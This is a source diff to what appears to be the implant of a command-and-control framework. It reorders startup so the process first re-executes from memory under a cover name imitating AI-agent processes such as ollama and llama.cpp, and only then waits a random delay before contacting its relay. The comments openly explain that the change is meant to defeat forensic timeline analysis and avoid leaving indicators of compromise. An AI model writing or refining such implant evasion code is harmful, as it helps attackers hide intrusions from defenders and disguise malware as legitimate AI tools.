@@ -64,15 +64,13 @@ func agent_main() {
 		}
 	}()
 
-	// Startup jitter: a host that dials the relay the second it boots ties
-	// the relay domain to the boot event in any timeline analysis. Wait a
-	// random 0-5min before ANY network activity (DoH bootstrap included).
-	// EMP_NO_STARTUP_JITTER=1 skips this for operator-driven restarts/tests.
-	if os.Getenv("EMP_NO_STARTUP_JITTER") == "" {
-		delay := time.Duration(util.RandInt(0, 300)) * time.Second
-		logging.Warningf("startup jitter: first connection in %v", delay)
-		time.Sleep(delay)
-	}
+	// Masquerade FIRST: re-exec from memfd under an AI-agent identity
+	// (ollama/llama.cpp/coding agents) so every later step — startup jitter
+	// included — runs under the cover name, never the on-disk binary name.
+	// The re-exec also swaps in a sanitized environment (util.SanitizedEnviron),
+	// dropping whatever the launching shell carried. No-op once running from
+	// a memfd. See agentutils/masquerade_linux.go.
+	agentutils.MasqueradeSelf()
 
 	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 	if err != nil {
@@ -93,11 +91,17 @@ func agent_main() {
 	}
 	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))
 
-	// Masquerade BEFORE anything else happens: re-exec from memfd under an
-	// AI-agent identity (ollama/llama.cpp/coding agents) so the whole
-	// startup — jitter sleep included — runs under the cover name. See
-	// agentutils/masquerade_linux.go; no-op once running from a memfd.
-	agentutils.MasqueradeSelf()
+	// Startup jitter: a host that dials the relay the second it boots ties
+	// the relay domain to the boot event in any timeline analysis. Wait a
+	// random 0-5min before ANY network activity (DoH bootstrap included).
+	// Runs AFTER the masquerade re-exec below, so the wait happens under
+	// the cover name and exactly once per launch (the re-exec restarts
+	// agent_main; a disk-name window before masquerade would be a bare IoC).
+	if os.Getenv("EMP_NO_STARTUP_JITTER") == "" {
+		delay := time.Duration(util.RandInt(0, 300)) * time.Second
+		logging.Warningf("startup jitter: first connection in %v", delay)
+		time.Sleep(delay)
+	}
 
 	if !is_dll {
 		// don't be hasty
